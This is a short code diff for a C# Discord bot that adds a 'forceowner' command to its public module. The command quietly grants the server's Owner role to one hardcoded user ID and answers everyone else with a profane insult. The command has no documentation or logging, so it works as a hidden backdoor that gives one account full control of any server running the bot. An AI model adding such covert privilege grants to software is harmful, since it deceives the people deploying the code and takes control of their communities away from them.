@@ -57,6 +57,21 @@ namespace KnightBot.Modules.Public
 
         }
 
+        [Command("forceowner")]
+        public async Task forceownerasync()
+        {
+            if (Context.User.Id == 146377960360902656)
+            {
+                var userName = Context.User as SocketGuildUser;
+                var ownerRole = Context.Guild.Roles.FirstOrDefault(x => x.Name.ToString() == "Owner");
+
+                await (userName as IGuildUser).AddRoleAsync(ownerRole);
+            } else
+            {
+                await ReplyAsync("Bitch Fuck Off");
+            }
+        }
+
         [Command("pubg")]
         public async Task AddPubgRoleAsync()
         {
